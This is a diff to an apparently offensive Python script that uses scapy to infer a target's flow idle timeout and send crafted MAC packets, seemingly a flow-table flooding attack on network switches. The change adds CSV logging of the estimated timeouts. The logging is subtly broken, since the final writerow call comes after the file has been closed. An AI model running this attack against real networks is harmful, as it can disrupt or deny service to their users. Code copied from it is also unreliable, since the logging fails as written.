@@ -4,6 +4,7 @@ import json
 import argparse
 import random
 import time
+import csv
 from scapy.all import sendp
 
 from ftf_utils import FTFUtils
@@ -14,7 +15,7 @@ def stage_0(dst_ip, max_iter=1000, max_interval=100):
     time.sleep(hard_timeout)
     af = FTFUtils.estimate_idle_timeout(dst_ip, max_iter, hard_timeout)
     print(f"[*] T_idle={af}", flush=True)
-    return af
+    return hard_timeout, af
 
 def stage_1(iface, npacket, added_new_packets, attack_frequency):
     packets = []
@@ -64,10 +65,15 @@ def main():
     parser.add_argument('--anp', type=int, required=True)
     parser.add_argument('--max-iter', type=int, default=1000)
     parser.add_argument('--max-interval', type=int, default=100)
+    parser.add_argument('--logs', type=str, default="/tmp/ftf.csv")
     args = parser.parse_args()
 
+    with open(args.logs, "w", newline="") as f:
+        writer = csv.writer(f)
+        writer.writerow(["npacket", "estimated_hard_timeout", "estimated_idle_timeout"])
+
     print("# [STAGE 0] T_idle Inference", flush=True)
-    attack_frequency = stage_0(args.dst_ip, args.max_iter, args.max_interval)
+    hard_timeout, attack_frequency = stage_0(args.dst_ip, args.max_iter, args.max_interval)
 
     print("# [STAGE 1] MAC Presenting", flush=True)
     macs = stage_1(args.iface, args.npacket, args.anp, attack_frequency)
@@ -76,6 +82,7 @@ def main():
     stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs)
 
     print("[+] Attacco completato.", flush=True)
+    writer.writerow([args.npacket, hard_timeout, attack_frequency])
 
 if __name__ == '__main__':
     main()
